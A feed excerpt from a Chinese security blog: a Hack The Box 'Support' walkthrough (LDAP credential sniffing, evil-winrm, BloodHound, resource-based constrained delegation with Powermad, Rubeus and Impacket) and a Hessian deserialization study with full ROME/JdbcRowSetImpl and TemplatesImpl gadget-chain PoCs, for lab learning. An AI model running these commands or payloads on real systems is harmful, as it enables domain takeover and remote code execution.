&lt;p&gt;下载下来之后，咱们把UserInfo.exe.zip解压到特定目录下，用file命令查看下该文件属性，得到以下信息，发现是&lt;code&gt;.NET&lt;/code&gt;程序，按照常理来讲，这个时候我们的流程应该是用&lt;code&gt;dnspy&lt;/code&gt;做逆向查看下这个文件究竟是何方神圣，然后欢欣雀跃的发现这是一个ldap通信程序，接着再拿gpt写解密脚本把ldap服务器的用户和密码都给破译出来，链接上dc的ldap服务再接着做渗透。但博主的逆向水平实在薄弱，咱们直接上wireshark抓ldap的绑定包查看用户密码也是可以的（ldap协议绑定包里不加密）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为是exe程序，linux下没法直接运行，这里是用了&lt;code&gt;wine&lt;/code&gt;来启动的（还挺难配）。在终端输入
&lt;code&gt;wine UserInfo.exe -v find -first test0&lt;/code&gt;的同时，用&lt;code&gt;wireshark&lt;/code&gt;抓&lt;code&gt;eth0&lt;/code&gt;的包，这里是先抓到了他的dns包，因为这个dns服务器不在公网，我们没办法通过这个域名解析获得到ip，需要我们自己去&lt;code&gt;/etc/hosts&lt;/code&gt;把&lt;code&gt;support.htb&lt;/code&gt;配置一下。这里还可以用&lt;code&gt;dig&lt;/code&gt;顺便挖一下历史解析记录。
&lt;code&gt;dig @10.10.11.174 +short support.htb any&lt;/code&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Support(HTB)/Pasted%20image%2020230905105451.png&quot; alt=&quot;&quot; /&gt;
把这个东西&lt;code&gt;10.10.11.174 dc.support.hub support.htb&lt;/code&gt;添加进去&lt;code&gt;hosts&lt;/code&gt;，然后用wireshark进行第二次抓包，如图筛选出来ldap协议的绑定包
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Support(HTB)/Pasted%20image%2020230905110422.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;用户：&lt;code&gt;support\ldap&lt;/code&gt;   密码：&lt;code&gt;nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz&lt;/code&gt;。
这里就已经可以连上ldap服务了，两条路子，可以用&lt;code&gt;ldapserch&lt;/code&gt;来连，也可以用&lt;code&gt;Activity Directory Studio&lt;/code&gt;来连，我们这里就用 &lt;code&gt;Activity Directory Studio&lt;/code&gt;来连了&lt;/p&gt;
&lt;p&gt;注意下 &lt;code&gt;DN&lt;/code&gt; 这里的填写,然后把刚才拿到的密码拿过来链接即可。
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Support(HTB)/Pasted%20image%2020230905111922.png&quot; alt=&quot;&quot; /&gt;
链接上以后，按&lt;code&gt;DC=support,DC=htb&lt;/code&gt; -&amp;gt; &lt;code&gt;CN=Users&lt;/code&gt;的结构查找到了&lt;code&gt;CN=support&lt;/code&gt; 这个项，发现Info里面竟然有点东西，猜测可能是密码，并且因为&lt;code&gt;support&lt;/code&gt;属于&lt;code&gt;Remote Management&lt;/code&gt;组，这里可以尝试用&lt;code&gt;evil-winrm&lt;/code&gt;来链接一下
&lt;code&gt;info:Ironside47pleasure40Watchful&lt;/code&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Support(HTB)/Pasted%20image%2020230905112807.png&quot; alt=&quot;&quot; /&gt;
(下面是关于winrm的一些介绍，我之前也没了解过这里)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;WinRM 是 Windows Remote Managementd（Windows 远程管理）的简称，是 Web 服务管理标准 WebService-Management 协议的 Microsoft 实现。该协议是基于简单对象访问协议（SOAP）的、防火墙友好的标准协议，允许来自不同供应商的硬件和操作系统能够互操作。  
WinRM 作为 Windows 操作系统的一部分，是一项允许管理员在系统上远程执行管理任务的服务。并且，WinRM 默认情况下支持 Kerberos 和 NTLM [身份验证](https://cloud.tencent.com/product/mfas?from=10680)以及基本身份验证，初始身份验证后，WinRM 会话将使用 AES 加密保护。使用 WinRM 服务需要拥有管理员级别的权限。  
在现代 Windows 系统中，WinRM HTTP 通过 TCP 端口 5985 进行通信，而 HTTPS（TLS）通过 TCP 端口 5986 进行通信。如果所有的机器都是在域环境下，则可以使用默认的 5985 端口，否则的话则通过 5986 端口使用 HTTPS 传输。  
使用 WinRM 我们可以在远程主机设置了防火墙的情况下远程管理这台[服务器](https://cloud.tencent.com/product/cvm?from=10680)，因为启动 WinRM 服务后，防火墙默认会自动放行 5985 端口。这样的管理服务当然不会被攻击者错过，在内网渗透中，我们可以使用 WinRM 服务进行横向移动，并且使用这种远程连接进行横向移动不容易被察觉到，也不会占用远程连接数。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在终端输入以下命令&lt;code&gt;evil-winrm -u support -p &apos;Ironside47pleasure40Watchful&apos; -i support.htb&lt;/code&gt;，直接就是链接成功拿下用户权限，这里几步并一步，在桌面上读取到了user的flag，跨步进入提权阶段。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Support(HTB)/Pasted%20image%2020230905113807.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;到了提权阶段，什么都是新鲜东西，看了看别的师傅写的wp，这里是用到了一个叫&lt;code&gt;SharpHound&lt;/code&gt;的工具，GPT的介绍大体如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SharpHound是BloodHound项目中的一个工具，用于收集Windows Active Directory环境中的信息，帮助进行网络攻击路径分析和权限提升。

SharpHound使用了BloodHound的数据收集库，通过调用Windows Management Instrumentation (WMI) 和其他技术来收集域控制器、用户、组、计算机等对象的信息，并生成BloodHound可识别的CSV格式的数据。这些数据可以导入到BloodHound中进行可视化分析，以发现潜在的攻击路径和权限提升机会。

在权限提升方面，SharpHound的主要作用是帮助识别Active Directory中的横向移动和权限扩展路径。通过收集信息，包括域控制器、用户、组、计算机、委派关系等，SharpHound可以帮助渗透测试人员或安全评估团队了解目标网络的拓扑结构、用户权限以及推断出可能存在的权限提升机会。

通过使用SharpHound和BloodHound可以实现以下目标：

1. 发现跳板（Pivot）机会：查找跨不同系统和域之间的信任关系，以寻找以后进行纵深渗透的跳板机会。
2. 识别特权用户：识别具有高权限或敏感特权的用户账户，用于后续攻击。
3. 发现无约束委派（Unconstrained Delegation）：识别存在无约束委派的对象，可能导致权限提升攻击。
4. 分析访问控制列表（ACLs）：定位弱或错误配置的访问权限，以便进行权限提升或横向渗透。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;先是把SharpHound.exe上传到DC主机上&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Support(HTB)/Pasted%20image%2020230905114945.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;再用SharpHound.exe对DC主机开始信息搜集，用到的命令如下，各个选项的解释也给附上了&lt;/p&gt;
&lt;p&gt;&lt;code&gt;./SharpHound.exe --memcache -c all -d SUPPORT.HTB -DomainController 127.0.0.1&lt;/code&gt;
1.  &lt;code&gt;--memcache&lt;/code&gt; : 启用Memcached收集方法，用于从目标计算机中收集数据。Memcached是一种常用的缓存技术，可以在网络攻击中用于获取敏感信息。
2.  &lt;code&gt;-c all&lt;/code&gt;：设置数据收集方法为&quot;all&quot;，即执行完整数据收集。此选项将包括跳板、组成员关系、本地管理员、用户有权访问的计算机等信息。
3.  &lt;code&gt;-d SUPPORT.HTB&lt;/code&gt;：指定目标域为&quot;SUPPORT.HTB&quot;。将&quot;SUPPORT.HTB&quot;替换为你要收集信息的目标域。
4. &lt;code&gt;DomainController 127.0.0.1&lt;/code&gt;：指定用于数据收集的域控制器的IP地址&lt;/p&gt;
&lt;p&gt;输入完之后会获得一个信息集合包，我们把他下载到本地进行分析&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Support(HTB)/Pasted%20image%2020230905154608.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;分析的工具用到的是&lt;code&gt;BloodHound&lt;/code&gt;，先找个终端把&lt;code&gt;neo4j&lt;/code&gt;给启动了，之后再找个终端去把&lt;code&gt;BloodHound&lt;/code&gt;给启动了，密码是我们自己设置的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Support(HTB)/Pasted%20image%2020230905155634.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;把刚拿到的文件拖进来分析后得到了一个非常酷炫的界面，选择 &lt;code&gt;Analysis&lt;/code&gt; -&amp;gt; &lt;code&gt;Shortest Paths&lt;/code&gt; -&amp;gt;&lt;code&gt;Shortest Paths to Unconstrained Delegation System&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Support(HTB)/Pasted%20image%2020230905160229.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;得到了这么一副图，我们会发现&lt;code&gt;SUPPORT.HTB&lt;/code&gt;域中的&lt;code&gt;SHARED SUPPORT ACCOUNTS@SUPPORT.HTB&lt;/code&gt;组对&lt;code&gt;DC.SUPPORT.HTB&lt;/code&gt;有&lt;code&gt;GenericAll&lt;/code&gt;权限。而我们可以访问的&lt;code&gt;support&lt;/code&gt;用户帐户正好是&lt;code&gt;SHARED SUPPORT ACCOUNTS@SUPPORT.HTB&lt;/code&gt;组的成员。&lt;/p&gt;
&lt;p&gt;以下是一些常见的权限清单。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;GenericAll&lt;/strong&gt; ： 对对象具有完全权限（例如，添加用户到组或重置用户密码）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;GenericWrite&lt;/strong&gt; ： 更新对象的属性（例如，登录脚本）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;WriteOwner&lt;/strong&gt; ： 将对象所有者更改为攻击者控制的用户以接管对象。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;WriteDACL&lt;/strong&gt; ： 修改对象的访问控制项（ACEs），并赋予攻击者对对象的完全控制权限。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;AllExtendedRights&lt;/strong&gt; ： 具备添加用户到组或重置密码的能力。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ForceChangePassword&lt;/strong&gt; ： 具备更改用户密码的能力。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Self (Self-Membership)&lt;/strong&gt; ： 具备将自身添加到组中的能力。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Support(HTB)/Pasted%20image%2020230905172821.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;因为后续的利用涉及到 &lt;code&gt;基于资源的约束委派攻击&lt;/code&gt;，这里简单的介绍一下流程，详情可以看下面这篇文章，感觉讲的非常nice。
&lt;a href=&quot;https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution&quot;&gt;Kerberos 基于资源的约束委派：计算机对象接管 - 红队说明 (ired.team)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;流程分析&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;获取目标主机上一个具有高权限的账号A，以达到修改目标主机配置的目的。&lt;/li&gt;
&lt;li&gt;利用账号A创建一个计算机对象并为其设置SPN（SPN是一个用于在Kerberos身份验证中标识和验证服务的机制，具有SPN的帐户通常用于充当服务或应用程序的身份）&lt;/li&gt;
&lt;li&gt;利用账号A修改目标主机配置(改 &lt;code&gt;msDS-AllowedToActOnBehalfOfOtherldentity&lt;/code&gt; 属性)，配置基于资源的约束委派，允许刚才创建的计算机对象成为万能委派账号，模拟任何用户（这里要模拟的是administarator用户）&lt;/li&gt;
&lt;li&gt;使用Rubeus工具执行完整的S4U攻击（S4U2Self和S4U2Proxy，攻击者通过S4U2Self请求获得了对管理员的访问权限，然后通过S4U2Proxy请求了对受害者主机的访问权限）&lt;/li&gt;
&lt;li&gt;通过哈希传递登录我们创建的计算机对象，再通过计算机对象代理administrator，实现提权。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;附上之后的命令集，先把创建的计算机对象添加到AD里
然后再使用“约束委派”权限对计算机对象进行设置&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 上传Powermad和Rubeus工具到目标计算机上。
# 这两个工具将用于执行后续的攻击步骤。
upload /home/user/Tools/Powermad/Powermad.ps1 pm.ps1
upload /home/user/Tools/Ghostpack-CompiledBinaries/Rubeus.exe r.exe

# 导入Powermad模块。
# 这个模块包含了执行特权升级攻击所需的功能。
Import-Module ./pm.ps1

# 设置变量，用于指定伪造的计算机对象名称和目标计算机名称。
Set-Variable -Name &quot;FakePC&quot; -Value &quot;FAKE01&quot;
Set-Variable -Name &quot;targetComputer&quot; -Value &quot;DC&quot;

# 使用Powermad，将新伪造的计算机对象添加到Active Directory（AD）中。
# 这个伪造计算机对象将用于后续的攻击步骤。
New-MachineAccount -MachineAccount (Get-Variable -Name &quot;FakePC&quot;).Value -Password $(ConvertTo-SecureString &apos;123456&apos; -AsPlainText -Force) -Verbose

# 使用内置的AD模块，为新伪造计算机对象授予受限委派权限。

Set-ADComputer (Get-Variable -Name &quot;targetComputer&quot;).Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name &quot;FakePC&quot;).Value + &apos;$&apos;)

# 使用内置的AD模块，检查上一条命令是否成功。
# 确保伪造计算机对象已被授予受限委派权限。
Get-ADComputer (Get-Variable -Name &quot;targetComputer&quot;).Value -Properties PrincipalsAllowedToDelegateToAccount
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Support(HTB)/Pasted%20image%2020230906011639.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Support(HTB)/Pasted%20image%2020230906011706.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 使用Rubeus生成新伪造计算机对象的密码哈希值，用于下一步
./r.exe hash /password:123456 /user:FAKE01$ /domain:support.htb
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Support(HTB)/Pasted%20image%2020230906012020.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;链接，提权，pwn!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# 在Kali上进行以下步骤。 
# 使用Impacket工具的getST.py生成一个缓存的TGT，并使用KERB5CCNAME变量传递缓存文件，以便后续请求所需的服务。。 
/home/user/Tools/impacket/examples/getST.py support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B 
# 设置本地变量KERB5CCNAME，以便传递TGT缓存文件，用于后续请求的服务。 
export KRB5CCNAME=administrator.ccache 
# 使用smbexec.py通过SMB协议连接到服务器，使用刚生成的TGT以administrator用户身份登录。 
smbexec.py support.htb/administrator@dc.support.htb -no-pass -k
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Support(HTB)/Pasted%20image%2020230906014057.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>关于Hessian链的探究</title><link>https://f4miti0n.github.io/posts/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</guid><pubDate>Tue, 29 Aug 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;前置知识&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;RPC协议
&lt;ul&gt;
&lt;li&gt;和之前学过的RMI协议有相似之处，都是用于实现远程调用的协议，类似于API调用的封装协议。不同的地方在于信息传输过程中对于所传递信息的编码处理上。RPC客户端在传递过程中首先会组织一个请求消息，包含了要调用的远程方法的名称、参数等信息。然后，根据RPC协议的规定，将这些信息按照特定的二进制格式进行编码。当RPC服务端收到传递信息之后，再根据RPC协议规定进行解码还原。&lt;/li&gt;
&lt;li&gt;除了在编码格式上存在差异以外，RPC协议与RMI协议在应用范围上也相差甚远。由于RPC协议使用 HTTP 或 TCP/IP 等底层网络协议进行通信，所以RPC协议并不会如RMI协议一样收到语言的限制，不仅仅是Java中可以使用RPC协议，Python等语言同样可以使用RPC协议&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Hessian协议
&lt;ul&gt;
&lt;li&gt;Hessian协议是RPC协议的一种具体的实现方式，是一种用于远程过程调用的二进制协议，通过紧凑的二进制格式实现高效的数据传输，同时具备跨平台的兼容性，适用于各种分布式系统和跨语言集成的场景。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Hessian反序列化器总结
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/image-20220419213031319.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;环境准备&lt;/h3&gt;
&lt;p&gt;pom.xml&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;dependency&amp;gt;  
    &amp;lt;groupId&amp;gt;com.caucho&amp;lt;/groupId&amp;gt;  
    &amp;lt;artifactId&amp;gt;hessian&amp;lt;/artifactId&amp;gt;  
    &amp;lt;version&amp;gt;4.0.63&amp;lt;/version&amp;gt;  
&amp;lt;/dependency&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;流程分析&lt;/h3&gt;
&lt;p&gt;在我们挖反序列化洞的过程中，经常能碰见以HashMap为起点的gadget，诸如Fastjson、ROME、CC6、URLDNS等等。我们这里的Hessian反序列化也是同理，我们尝试着跟着MapDeserial#readMap看一看&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/Pasted%20image%2020230829004706.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;能够清楚的看到，在末了会调用map.put这个方法，而在我们前面的gadget复盘里面，我们也早就知道了&lt;code&gt;map.put()&lt;/code&gt;会对&lt;code&gt;key&lt;/code&gt;进行 hashcode() 调用，也就是说我们只需要找到一个以hashcode为入口的链子搭配使用即可，这里附上之前复现的&lt;code&gt;rome&lt;/code&gt;链进行参考&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/Pasted%20image%2020230829003032.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;只需要把rome链粘贴过来就好哩，炒鸡简单，但这里因为Hessian反序列化自身特性的原因，我们不能直接把TemplatesImpl类加载这条简单链子作为RCE执行链，我们可以跟进看一下用Java原生反序列化和用Hessian反序列化在这里的差别&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/VZATJ~V5ZSYT~8Z%29ZU0PG0X.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/4Y%28%25%5B3AMD3B%7BYAIVK%294Y4GL.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;可以清楚地看到，使用Hessian进行反序列化的对照组会因为&lt;code&gt;_tfactory&lt;/code&gt;属性为null而在&lt;code&gt;TemplatesImpl#defineTransletClasses()&lt;/code&gt;处中断执行，反之Java原生反序列化组则不存在相关问题，究其根本，是因为这里涉及到了一个关键字定义的问题，我们去审计一下TemplatesImpl这个类的源码看看。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/Pasted%20image%2020230829190928.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;能够看到，&lt;code&gt;TemplatesImpl&lt;/code&gt;这里的&lt;code&gt;_tfactory&lt;/code&gt;属性是被&lt;code&gt;transient&lt;/code&gt;关键字所修饰的，这也就意味着在常规反序列化过程中，该属性的值无法与被序列化的原对象保持一致，但为什么Java原生反序列化中却又不存在这种置空现象？这里我们可以根进一下&lt;code&gt;TemplatesImpl#readObject()&lt;/code&gt; 寻找答案。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/Pasted%20image%2020230829191636.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;可以看到，在line#266，TemplatesImpl自己就会给_tfactory赋值，压根不用担心置空问题。而当我们通过Hessian进行反序列化的时候，默认是不会调用gadget中类的readObject方法的，这才酿此大祸。这里我们换一条执行链，把类加载链改成经典的JdbcRowSetImpl链，但因为之前的文章一直没有详细复盘过JdbcRowSetImpl链，我们这里先进到JdbcRowSetImp里来盘一盘这条链子。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/Pasted%20image%2020230829192731.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;直接找lookup就能定位到&lt;code&gt;connect()&lt;/code&gt;，因为这里的&lt;code&gt;getDataSourceName&lt;/code&gt;返回值可以被我们任意控制，显然可以当做利用点，接着再查找用法，在&lt;code&gt;getDatabaseMetaData()&lt;/code&gt; 这里找到了getter方法直接掉宝。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/Pasted%20image%2020230829193136.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;因为是jndi注入链，jdk版本限制会高一些，这里一开始就是忘换版本了，卡了一会儿。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;RMI利用的JDK版本≤ JDK 6u132、7u122、8u113
LADP利用JDK版本≤ 6u211 、7u201、8u191
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里换上万能的jdk66开搞，附上完整poc&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package org.example;  
import com.caucho.hessian.io.Hessian2Input;  
import com.caucho.hessian.io.Hessian2Output;  
import com.sun.rowset.JdbcRowSetImpl;  
import com.sun.syndication.feed.impl.ObjectBean;  
import com.sun.syndication.feed.impl.ToStringBean;  
import java.io.ByteArrayInputStream;  
import java.io.ByteArrayOutputStream;  
import java.io.IOException;  
import java.io.Serializable;  
import java.lang.reflect.Field;  
import java.util.HashMap;  
public class Hessian_Test implements Serializable {  
    public static &amp;lt;T&amp;gt; byte[] serialize(T o) throws IOException {  
        ByteArrayOutputStream os = new ByteArrayOutputStream();  
        Hessian2Output output = new Hessian2Output(os);  
        output.writeObject(o);   //对象写在这  
        output.close();  
        System.out.println(os.toString());  
        return os.toByteArray();  
    }  
    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{  
        Field f = obj.getClass().getDeclaredField(field);  
        f.setAccessible(true);  
        f.set(obj, arg);  
    }  
    public static &amp;lt;T&amp;gt; T deserialize(byte[] bytes) throws IOException {  
        ByteArrayInputStream bai = new ByteArrayInputStream(bytes);  
        Hessian2Input input = new Hessian2Input(bai);  
        Object o = input.readObject();  
        return (T) o;  
    }  
  
    public static void main(String[] args) throws Exception {  
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();  
        jdbcRowSet.setDataSourceName(&quot;ldap://127.0.0.1:1389/bj56m8&quot;);  
        ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, jdbcRowSet);  
        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);  
        HashMap hashMap = new HashMap();  
        hashMap.put(objectBean, &quot;x&quot;);  
        setFieldValue(objectBean, &quot;_cloneableBean&quot;, null);  
        setFieldValue(objectBean, &quot;_toStringBean&quot;, null);  
        deserialize(serialize(hashMap));  
    }  
  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里顺便提一下&lt;code&gt;Hessian2Output()&lt;/code&gt;，在这个方法内部会根据传来的序列化值的首字节进行反序列化器的选择，这里tag是77，选中的就是我们上文的&lt;code&gt;MapDeserializer&lt;/code&gt;，运行结果如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/Pasted%20image%2020230829210558.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;关于TemplatesImpl链完善&lt;/h3&gt;
&lt;p&gt;本来以为TemplatesImpl链和Hessian已经没有缘分了，但后来查资料的时候看到了别的师傅用二次反序列化给绕过去了，这里也记录一下。&lt;/p&gt;
&lt;p&gt;ROME链调用SignedObject#getObject() --&amp;gt;  ROME链调TemplateImpl链&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package org.example;  
  
import com.caucho.hessian.io.Hessian2Input;  
import com.caucho.hessian.io.Hessian2Output;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import com.sun.rowset.JdbcRowSetImpl;  
import com.sun.syndication.feed.impl.ObjectBean;  
import com.sun.syndication.feed.impl.ToStringBean;  
import javassist.ClassPool;  
import javassist.CtClass;  
import javassist.CtConstructor;  
  
import javax.xml.transform.Templates;  
import java.io.*;  
import java.lang.reflect.Field;  
import java.security.KeyPair;  
import java.security.KeyPairGenerator;  
import java.security.Signature;  
import java.security.SignedObject;  
import java.util.HashMap;  
import java.util.Map;  
  
public class Hessian_Test implements Serializable {  
  
    public static &amp;lt;T&amp;gt; byte[] serialize(T o) throws IOException {  
        ByteArrayOutputStream os = new ByteArrayOutputStream();  
        Hessian2Output output = new Hessian2Output(os);  
        output.writeObject(o);   //对象写在这  
        output.close();  
        System.out.println(os.toString());  
        return os.toByteArray();  
    }  
    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{  
        Field f = obj.getClass().getDeclaredField(field);  
        f.setAccessible(true);  
        f.set(obj, arg);  
    }  
    public static &amp;lt;T&amp;gt; T deserialize(byte[] bytes) throws IOException {  
        ByteArrayInputStream bai = new ByteArrayInputStream(bytes);  
        Hessian2Input input = new Hessian2Input(bai);  
        Object o = input.readObject();  
        return (T) o;  
    }  
  
    public static void main(String[] args) throws Exception {  
        //设置TemplatesImpl链作为ROME2的出口  
        ClassPool pool = ClassPool.getDefault();  
        CtClass ctClass = pool.makeClass(&quot;i&quot;);  
        CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);  
        ctClass.setSuperclass(superClass);  
        CtConstructor constructor = ctClass.makeClassInitializer();  
        constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;);  
        byte[] bytes = ctClass.toBytecode();  
        TemplatesImpl templatesImpl = new TemplatesImpl();  
        setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][]{bytes});  
        setFieldValue(templatesImpl, &quot;_name&quot;, &quot;ROME2&quot;);  
        //HashMap2设置成ROME2的入口  
        ToStringBean toStringBean2 = new ToStringBean(Templates.class, templatesImpl);  
        ObjectBean objectBean2 = new ObjectBean(ToStringBean.class, toStringBean2);  
        HashMap hashMap2 = new HashMap();  
        hashMap2.put(objectBean2, &quot;hashMap2&quot;);  
        //设置SignedObject，把HashMap2给绑上去  
        KeyPairGenerator kpg = KeyPairGenerator.getInstance(&quot;DSA&quot;);  
        kpg.initialize(1024);  
        KeyPair kp = kpg.generateKeyPair();  
        SignedObject signedObject = new SignedObject(hashMap2, kp.getPrivate(), Signature.getInstance(&quot;DSA&quot;));  
        //HashMap1设置为ROME1的入口,SignedObject成为ROME1的出口  
        ToStringBean toStringBean1 = new ToStringBean(SignedObject.class, signedObject);  
        ObjectBean objectBean1 = new ObjectBean(ToStringBean.class, toStringBean1);  
        HashMap hashMap1 = new HashMap();  
        hashMap1.put(objectBean1, &quot;hashMap1&quot;);  
        deserialize(serialize(hashMap1));  
    }  
  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Hessian%E9%93%BE/Pasted%20image%2020230829235356.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Frida的甜蜜初体验</title><link>https://f4miti0n.github.io/posts/frida-%E5%88%9D%E4%BD%93%E9%AA%8C/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/frida-%E5%88%9D%E4%BD%93%E9%AA%8C/</guid><pubDate>Mon, 21 Aug 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h3&gt;环境准备&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;夜神模拟器&lt;/li&gt;
&lt;li&gt;frida-server + frida&lt;/li&gt;
&lt;li&gt;andriod studio (可选)&lt;/li&gt;
&lt;/ul&gt;
